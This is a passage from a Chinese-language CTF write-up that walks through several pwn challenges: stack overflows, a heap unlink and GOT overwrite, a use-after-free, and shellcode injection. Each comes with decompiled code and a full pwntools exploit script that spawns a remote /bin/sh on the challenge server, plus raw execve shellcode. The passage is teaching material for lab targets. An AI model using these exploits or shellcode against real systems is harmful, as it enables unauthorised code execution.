双击`vuln()`函数查看源码，分析后发现`fgets()`函数限制输入`32`个字节到变量`s`中，乍一看并没有超出可用栈大小。但是审计代码时会发现第`19`行的`replace()`函数会把输入的`I`替换成`you`，`1`个字符变成`3`个字符，并且在第`27`行会对原来的`s`变量重新赋值。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/4.png)

在`Functions window`可以看到有一个`get_flag()`函数，按`F5`反汇编可以看到这是一个系统调用，且`get_flag()`函数的起始地址为`0x8048F0D`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/5.png)

查看栈结构发现`s`的长度为`0x3c`，即`60`个字节，而输入被限制在`32`个字节内，每个`I`可以被替换成`you`，所以输入`60÷3=20`个`I`就能让栈溢出，然后`db 4 dup(?)` 还需要占用`4`个字节的内存，最后加上`get_flag()`函数的起始地址`0x8048F0D`构成`payload`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/6.png)

编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10356`，发送`payload`即可得到`PTB{9ecbaa04-d23f-4d99-a1e0-6b9d8f6a5211}`。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10356)
e = ELF('pwn1_sctf_2016')
address = e.symbols['get_flag']
log.success('get_flag_address => %s' % hex(address).upper())
payload = b'I'*20 + b'a'*0x4 + p32(address)
# payload = b'I'*20 + b'a'*0x4 + p32(0x8048F0D)
io.sendline(payload)
io.interactive()
```

------

### [getshell](https://ce.pwnthebox.com/challenges?type=4&id=1773)

先`file ./wustctf2020_getshell`查看文件类型再`checksec --file=./wustctf2020_getshell`检查了一下文件保护情况。

使用`IDA pro 32bit`打开附件`wustctf2020_getshell`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`函数查看详情，发现有个`char`型数组变量`buf`，`buf`的长度只有`0x18`，但是`gets()`函数读取输入到变量`buf`时限制输入的大小是`0x20`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable()
{
  char buf[24]; // [esp+0h] [ebp-18h] BYREF

  return read(0, buf, 0x20u);
}
```

此外在`Functions window`中还能看到`shell`函数，起始地址为`0x804851B`，查看`shell`函数发现返回值直接是`system("/bin/sh")`。

```c
int shell()
{
  return system("/bin/sh");
}
```

构造`Payload`时先用`0x18`个字节占满`buf`变量，再用`4`个字节覆盖到栈帧，接着再加上`shell`函数的地址以调用靶机的`shell`脚本。

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{c0d1c12f-9600-4e2a-a12b-426ba9e63083}`即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10267)
e = ELF('./wustctf2020_getshell')
shell = e.symbols['shell'] # 0x804851B
log.success('shell_address => %s'%hex(shell))
payload = b'a'*0x18 + b'pwn!' + p32(shell)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/1773/1.png)

------

### [ciscn_2019_n_1](https://ce.pwnthebox.com/challenges?type=4&id=524)

先`file ./ciscn_2019_n_1`查看文件类型再`checksec --file=ciscn_2019_n_1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/1.png)

用`IDA Pro 64bit`打开`ciscn_2019_n_1`后按`F5`反汇编源码并查看主函数，发现`fun()`函数最可疑。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/2.png)

双击`func()`函数查看源码可以看到当`v2 = 11.28125`时会有一个系统调用。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/3.png)

查看汇编代码双击`cs:dword_4007F4`可以看到`11.28125`在内存中的`16`进制表示为`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/4.png)

查看栈结构，此处`var_30`是`v1`，而`var_4`是`v2`，需要`(0x30-0x04)=44`个字节就能让栈溢出，最后再填入`11.28125`对应的十六进制数`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/5.png)

编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10406`，发送`payload`即可得到`PTB{7a857dc1-60e5-41a8-b615-3dd418407a0a}`。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10406)
payload = b'a'*(0x30 - 0x4) + p64(0x41348000)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/524/1.png)

------

### [Easyheap](https://ce.pwnthebox.com/challenges?type=4&id=1387)

先`file ./easyheap `查看文件类型，再`checksec --file=./easyheap `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./easyheap            
./easyheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=474c468173fd4e4bf36f20820d6fc2c3b5abed7a, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./easyheap 
[*] '/home/tyd/ctf/pwn/pwnthebox/easyheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开`easyheap`后按`F5`反汇编源码并查看主函数。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 8uLL);
      v3 = atoi(buf);
      if ( v3 != 3 )
        break;
      delete_heap();
    }
    if ( v3 > 3 )
    {
      if ( v3 == 4 )
        exit(0);
      if ( v3 == 4869 )
      {
        if ( (unsigned __int64)magic <= 0x1305 )
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          l33t();
        }
      }
      else
      {
LABEL_17:
        puts("Invalid Choice");
      }
    }
    else if ( v3 == 1 )
    {
      create_heap();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_17;
      edit_heap();
    }
  }
}
```

双击`menu()`函数查看详情，发现该程序的功能如下：`1`创建堆，`2`修改堆，`3`删除堆。

```c
int menu()
{
  puts("--------------------------------");
  puts("       Easy Heap Creator       ");
  puts("--------------------------------");
  puts(" 1. Create a Heap               ");
  puts(" 2. Edit a Heap                 ");
  puts(" 3. Delete a Heap               ");
  puts(" 4. Exit                        ");
  puts("--------------------------------");
  return printf("Your choice :");
}
```

双击`create_heap()`函数查看详情，发现最多创建`10`个`chunk`，`heaparray[i]`用来存放`chunk`的地址，`heaparray`是存放在`.bss`段上的，`read_input(heaparray[i], size);`用来向`chunk`中写入`size`大小的内容。

```c
unsigned __int64 create_heap()
{
  int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !*(&heaparray + i) )    // if(!heaparray[i])
    {
      printf("Size of Heap : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      *(&heaparray + i) = malloc(size);
      if ( !*(&heaparray + i) )
      {
        puts("Allocate Error");
        exit(2);
      }
      printf("Content of heap:");
      read_input(*(&heaparray + i), size);  // read_input(heaparray[i], size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

双击`edit_heap()`函数查看详情，`read_input(heaparray[v1], v2);`向`chunk`中写入`v2`大小的内容，如果`v2`比`create_heap()`中创建堆时的`size`更大的话就能形成堆溢出漏洞。

```c
unsigned __int64 edit_heap()
{
  int v1; // [rsp+4h] [rbp-1Ch]
  __int64 v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    printf("Size of Heap : ");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    printf("Content of heap : ");
    read_input(*(&heaparray + v1), v2);  // read_input(heaparray[v1], v2); 
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

双击`delete_heap()`函数查看详情，`free(heaparray[v1]);`将释放掉`heaparray[v1]`所对应的`chunk`，`heaparray[v1]=0LL;`将指针置为`0`，因此不存在`UAF`。

```c
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&heaparray + v1) )
  {
    free(*(&heaparray + v1));   // free(heaparray[v1]);
    *(&heaparray + v1) = 0LL;   // heaparray[v1] = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

此外，注意到`l33t()`函数能直接调用`cat /home/pwn/flag`，但是它会报错`cat: /home/pwn/flag: No such file or directory`。

```c
int l33t()
{
  return system("cat /home/pwn/flag");
}
```

如果程序开启了`PIE`保护的话，在每次加载程序时都变换加载地址，该程序`No PIE`说明未开启地址无关可执行。根据以上分析可知该程序的堆是存放在`.bss`段上的，且存在堆溢出，我们可以尝试修改`free`的`got`表，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10428`，发送`payload`即可得到`PTB{115d0d71-b9b7-4dcc-9df6-ced7635a87d1}`。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10428)
e = ELF('./easyheap')

def create(size,content):
    io.sendlineafter(b'Your choice :', b'1')
    io.recvuntil('Size of Heap : ')
    io.sendline(str(size))
    io.recvuntil('Content of heap:')
    io.sendline(content)

def edit(index, size, content):
    io.sendlineafter(b'Your choice :', b'2')
    io.recvuntil('Index :')
    io.sendline(str(index))
    io.recvuntil('Size of Heap : ')
    io.sendline(str(size))
    io.recvuntil('Content of heap : ')
    io.sendline(content)

def delete(index):
    io.sendlineafter(b'Your choice :', b'3')
    io.recvuntil('Index :')
    io.sendline(str(index))

heaparray_creater = 0x6020E0
system_plt = e.plt['system']
free_got = e.got['free']

# 先创建3个chunk
create(0x90,b'aaaa') #chunk0
create(0x90,b'bbbb') #chunk1
create(0x20,b'/bin/sh\x00') #chunk2

# 编辑chunk0 构造出一个fake_chunk, 用于在释放chunk1时方便chunk1和fake_chunk进行合并
fake_chunk = p64(0) + p64(0x91) + p64(heaparray_creater-0x18) + p64(heaparray_creater-0x10)
fake_chunk = fake_chunk.ljust(0x90, b'a')
fake_chunk += p64(0x90) + p64(0xa0)
edit(0,0x100,fake_chunk)
delete(1)
payload = p64(0)*3 +p64(free_got)
edit(0,0x20 ,payload)
# 将free_got修改成system_plt, 这样在执行delete()时真正执行的就是system
edit(0,8,p64(system_plt))
delete(2)

io.interactive()
```

------

### ♥ [b0verfl0w](https://ce.pwnthebox.com/challenges?type=4&id=1642)

先`file ./b0verfl0w `查看文件类型，再`checksec --file=./b0verfl0w `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./b0verfl0w          
./b0verfl0w: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./easyheap 
[*] '/home/tyd/ctf/pwn/pwnthebox/easyheap'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

使用`IDA pro 32bit`打开附件`b0verfl0w`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  return vul();
}
```

双击`vul()`函数继续审计源码，该函数中有个局部变量`s`是`char`型数组，`s`的长度是`32`字节，可用栈大小为`0x38`字节。`fgets()`函数读取输入到变量`s`时限制输入的大小为`50`字节，显然存在栈溢出漏洞。

```c
int vul()
{
  char s[32]; // [esp+18h] [ebp-20h] BYREF

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(s, 50, stdin);
  printf("Hello %s.", s);
  fflush(stdout);
  return 1;
}
```

`fgets()`只能输入`50`个字节，其中`padding`占了`0x20`个字节，`fake ebp`还需要`0x4`个字节覆盖到栈帧底部，`ret`还需要`0x4`个字节，实际剩下的就只有`0xa`个字节。我们可以这样来构造栈，在栈的初始位置写入一段`shellcode`，然后最后`0xa`个字节让程序跳转到栈的起始处执行`shellcode`。

![](https://paper.tanyaodan.com/PwnTheBox/1642/1.jpg)

注意到`Functions window`中有个`hint`函数，其汇编代码如下，可以看到`jmp esp`的地址是`0x8048504`，这就不需要用`ROPgadget`来获取`jmp esp`的地址啦。当`ret`指令是从段间转移的`call`指令进入的子程序中返回时，会修改`eip`和`esp`寄存器。所以当`ret`的地址被赋值为`0x8048504`时就会执行`jmp esp`，此时`esp = esp + 4`，`esp`寄存器指向`sub esp, 0x28; jmp esp`，同时`esp`寄存器中的数据出栈赋值给`eip`寄存器，`eip`寄存器也指向`sub esp, 0x28; jmp esp`，这样就可以劫持`esp`寄存器指向`shellcode`处，程序继续执行`jmp esp`，就会跳转到栈的起始处执行`shellcode`。

```assembly
.text:080484FD                 public hint
.text:080484FD hint            proc near
.text:080484FD ; __unwind {
.text:080484FD                 push    ebp
.text:080484FE                 mov     ebp, esp
.text:08048500                 sub     esp, 24h
.text:08048503                 retn
.text:08048503 hint            endp ; sp-analysis failed
.text:08048503
.text:08048504 ; ---------------------------------------------------------------------------
.text:08048504                 jmp     esp
.text:08048506 ; ---------------------------------------------------------------------------
.text:08048506                 retn
.text:08048507 ; ---------------------------------------------------------------------------
.text:08048507                 mov     eax, 1
.text:0804850C                 pop     ebp
.text:0804850D                 retn
.text:0804850D ; } // starts at 80484FD
```

编写`shellcode`来获取`system("/bin/sh")`以操控靶机。

```assembly
xor eax, eax    ; clear eax
xor edx, edx    ; clear edx
push edx        ; 将0入栈 标记了'/bin/sh'的结尾
push 0x68732f2f ; 将'/sh'的地址入栈 为了4字节对齐 传递的是'//sh', 这在execve()中等同于'/sh'
push 0x6e69622f ; 将'/bin'的地址入栈
mov ebx, esp    ; 此时esp指向'/bin/sh' 通过esp将字符串赋值给ebx
xor ecx, ecx    ; clear ecx
mov al, 0xb     ; eax置为execve()函数的中断号
int 0x80        ; 调用syscall()函数软中断
```

编写`shellcode`来获取`system("/bin/sh")`汇编代码所对应的机器码，`i386`架构下的`shellcode`一共有三种写法。

```python
shellcode = '''
xor eax, eax
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov al, 0xb
int 0x80
'''
shellcode = asm(shellcode) # len(shellcode) = 23
# 以上代码等价于下面这行 不过下面这行更简洁 len(shellcode) = 21
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

shellcode = asm(shellcraft.sh()) # 一般情况下不用 太长啦 len(shellcode) = 44
```

编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10461`，发送`payload`即可得到`PTB{986eef70-9609-4709-b34a-e07257c82b53}`，提交即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10461)

shellcode = '''
xor eax, eax
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov al, 0xb
int 0x80
'''
shellcode = asm(shellcode)
# shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

jmp_esp = 0x8048504
sub_esp_jmp = asm('sub esp, 0x28; jmp esp')
payload = shellcode + (0x20-len(shellcode)+4)*b'a' + p32(jmp_esp) + sub_esp_jmp

io.sendlineafter("What's your name?", payload)
io.interactive()
```

------

### [baby rop 2](https://ce.pwnthebox.com/challenges?type=4&page=1&id=558)



### [uaf](https://ce.pwnthebox.com/challenges?id=559)

先`file ./hacknote `查看文件类型，再`checksec --file=./hacknote `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./hacknote            
./hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44ee75c492628b3691cdcdb07759e9bbe551644a, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./hacknote            
[*] '/home/tyd/ctf/pwn/pwnthebox/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`hacknote`，按`F5`反汇编源码并查看主函数。输入`1`增加节点，输入`2`删除节点，输入`3`打印节点。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[4]; // [esp+0h] [ebp-Ch] BYREF
  int *v5; // [esp+4h] [ebp-8h]

  v5 = &argc;
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 4u);
      v3 = atoi(buf);
      if ( v3 != 2 )
        break;
      del_note();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        print_note();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      add_note();
    }
  }
}
```

查看增加节点的函数`add_note()`，发现最多创建`5`个`chunk`，`notelist[i]`用来存放`chunk`的地址，`notelist`是存放在`.bss`段上的，申请了一个大小为`8`字节的`chunk`保存当前`chunk`的指针，然后再`malloc`用户申请的`chunk`。

`read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size)`用来向`chunk`中写入`size`大小的内容。

```c
int add_note()
{
  int result; // eax
  int v1; // esi
  char buf[8]; // [esp+0h] [ebp-18h] BYREF
  size_t size; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]

  result = count;
  if ( count > 5 )
    return puts("Full");
  for ( i = 0; i <= 4; ++i )
  {
    result = *((_DWORD *)&notelist + i);
    if ( !result )
    {
      *((_DWORD *)&notelist + i) = malloc(8u);
      if ( !*((_DWORD *)&notelist + i) )
      {
        puts("Alloca Error");
        exit(-1);
      }
      **((_DWORD **)&notelist + i) = print_note_content;
      printf("Note size :");
      read(0, buf, 8u);
      size = atoi(buf);
      v1 = *((_DWORD *)&notelist + i);
      *(_DWORD *)(v1 + 4) = malloc(size);
      if ( !*(_DWORD *)(*((_DWORD *)&notelist + i) + 4) )
      {
        puts("Alloca Error");
        exit(-1);
      }
      printf("Content :");
      read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size);
      puts("Success !");
      return ++count;
    }
  }
  return result;
}
```

`del_note()`函数中，`free`释放掉相应的`chunk`后并没有将`chunk`的指针置为`0`，所以存在`uaf`漏洞。

```c
int del_note()
{
  int result; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  int v2; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  read(0, buf, 4u);
  v2 = atoi(buf);
  if ( v2 < 0 || v2 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  result = *((_DWORD *)&notelist + v2);
  if ( result )
  {
    free(*(void **)(*((_DWORD *)&notelist + v2) + 4));
    free(*((void **)&notelist + v2));
    result = puts("Success");
  }
  return result;
}
```

`print_note()`函数可以用来输出`chunk`中的内容。

```c
int print_note()
{
  int result; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  int v2; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  read(0, buf, 4u);
  v2 = atoi(buf);
  if ( v2 < 0 || v2 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  result = *((_DWORD *)&notelist + v2);
  if ( result )
    result = (**((int (__cdecl ***)(_DWORD))&notelist + v2))(*((_DWORD *)&notelist + v2));
  return result;
}
```

注意到程序中有个`magic()`函数地址为`0x8048945`。

```c
int magic()
{
  return system("/bin/sh");
}
```

我们可以利用`uaf`漏洞来修改`chunk`指针的内容从而调用`/bin/sh`，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10020`，发送`payload`即可得到`PTB{cb3bb65d-204d-45b7-a565-6553d0de729c}`。

```python
from pwn import *

def add(size, content):
    io.sendlineafter('Your choice :', '1')
    io.sendlineafter('Note size :', str(size))
    io.sendlineafter('Content :', content)

def free(index):
    io.sendlineafter('choice :', '2')
    io.sendlineafter('Index :', str(index))

def show(index):
    io.sendlineafter('choice :', '3')
    io.sendlineafter('Index :', str(index))

io = remote('redirect.do-not-trust.hacking.run', 10020)
magic_address = 0x8048945
add(0x20, b'fuck')
add(0x20, b'fuck')
free(0)
free(1)
add(0x8, p64(magic_address))
show(0)
io.interactive()
```

------

### [Shell 黑客 1](https://ce.pwnthebox.com/challenges?id=1007)

题目没有附件，`nc redirect.do-not-trust.hacking.run 10021`可以输入但是没有回显。结合题目描述：

> 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！

直接`asm(shellcraft.sh())`来执行`system("/bin/sh")`获取靶机`shell`权限。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10021`，发送`payload`即可得到`PTB{9c4fe944-0fdc-497a-ad2a-05e609bc4a3d}`，提交即可。

```python
from pwn import *

context(arch = 'amd64', os = 'linux',log_level = 'debug')
io = remote('redirect.do-not-trust.hacking.run', 10021)
io.sendline(asm(shellcraft.sh()))
io.interactive()
```

------

### [bof](https://ce.pwnthebox.com/challenges?id=945)

先`file ./hacknote `查看文件类型，再`checksec --file=./hacknote `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./bof                 
./bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d52165d6e0b268def0e0344ffa9e9e5247f1a9e2, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./bof                 
[*] '/home/tyd/ctf/pwn/pwnthebox/bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

用`IDA Pro 64bit`打开`bof`后按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  puts("Greetings! Have fun with Xp0int!");
  puts("Your name: ");
  read(0, &NAME, 0x18uLL);
  fun1();
  return 0;
}
```

`NAME`变量存放在`.bss`段上，程序存在栈溢出漏洞且未开启`NX`防护，可以通过`read()`函数向`.bss`段写入`0x18`字节的`shellcode`。

双击`NAME`变量可以看到其起始地址为`0x404070`。

```assembly
.bss:0000000000404070                 public NAME
.bss:0000000000404070 NAME            db    ? ;               ; DATA XREF: main+50↑o
.........
.bss:0000000000404087 _bss            ends
```

`fun1()`函数详情如下：

```c
ssize_t __fastcall fun1(__int64 a1, const char *a2)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("Well, %s this is a simple one.(*_*)\n", a2);
  return read(0, buf, 0x30uLL);
}
```

双击`buf`变量可以查看大致栈结构，我们需要`0x20`个字节来覆盖`padding`，`fake rbp`还需要`0x8`个字节覆盖到栈帧底部。

```assembly
-0000000000000020 ; D/A/*   : change type (data/ascii/array)
-0000000000000020 ; N       : rename
-0000000000000020 ; U       : undefine
-0000000000000020 ; Use data definition commands to create local variables and function arguments.
-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
-0000000000000020 ;
-0000000000000020
-0000000000000020 buf             db 32 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

`amd64`架构的`shellcode`汇编代码如下：

```assembly
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f ; 将'/bin/sh'传递给rdi
push rdi                  ; 将'/bin/sh'压入栈
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b                 ; 系统调用号
pop rax
syscall
```

然而它超过了`0x18`字节，科学上网找了个简短的`shellcode`。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10025`，发送`payload`即可得到`PTB{ecfca74a-376c-4e71-8e09-da5cf5c3f024}`，提交即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10025)
address = 0x404070
shellcode = '''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
'''
print(len(asm(shellcode))) # 30 超过了0x18 重新写
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
io.sendline(shellcode)
payload = b'a'*(0x20+0x8)+p64(address)
io.sendline(payload)
io.interactive()
```

------

### [Getting Start](https://ce.pwnthebox.com/challenges?id=1697)

先`file ./task_gettingStart_ktQeERc  `查看文件类型，再`checksec --file=./task_gettingStart_ktQeERc  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./task_gettingStart_ktQeERc
./task_gettingStart_ktQeERc: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8889abb24c5308b96e8483d5dbdd1aa67fffdaa4, stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./task_gettingStart_ktQeERc
[*] '/home/tyd/ctf/pwn/pwnthebox/task_gettingStart_ktQeERc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`2018_gettingstart`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`buf`，`buf`的可用栈大小为`0x30`，`read()`函数读取输入到`buf`变量时限制的字节数为`0x28`，双击`buf`变量可以查看栈结构。

注意到当`v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1`这个条件成立时就会发生系统调用`system('/bin/sh')`。

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 buf[3]; // [rsp+10h] [rbp-30h] BYREF
  __int64 v5; // [rsp+28h] [rbp-18h]
  double v6; // [rsp+30h] [rbp-10h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  buf[2] = 0LL;
  v5 = 0x7FFFFFFFFFFFFFFFLL;
  v6 = 1.797693134862316e308;
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("HuWangBei CTF 2018 will be getting start after %lu seconds...\n", 0LL);
  puts("But Whether it starts depends on you.");
  read(0, buf, 0x28uLL);
  if ( v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1 )
  {
    printf("HuWangBei CTF 2018 will be getting start after %g seconds...\n", v6);
    system("/bin/sh");
  }
  else
  {
    puts("Try again!");
  }
  return 0LL;
}
```

分别双击`v5`和`v6`可以看到其在栈中的位置，构造`payload`时只需要将`v5`和`v6`重新赋值即可让主函数中的`if`条件成立。

```assembly
-0000000000000040 ; D/A/*   : change type (data/ascii/array)
-0000000000000040 ; N       : rename
-0000000000000040 ; U       : undefine
-0000000000000040 ; Use data definition commands to create local variables and function arguments.
-0000000000000040 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000040 ; Frame size: 40; Saved regs: 8; Purge: 0
-0000000000000040 ;
-0000000000000040
-0000000000000040                 db ? ; undefined
-000000000000003F                 db ? ; undefined
-000000000000003E                 db ? ; undefined
-000000000000003D                 db ? ; undefined
-000000000000003C                 db ? ; undefined
-000000000000003B                 db ? ; undefined
-000000000000003A                 db ? ; undefined
-0000000000000039                 db ? ; undefined
-0000000000000038 var_38          dq ?
-0000000000000030 buf             dq ?
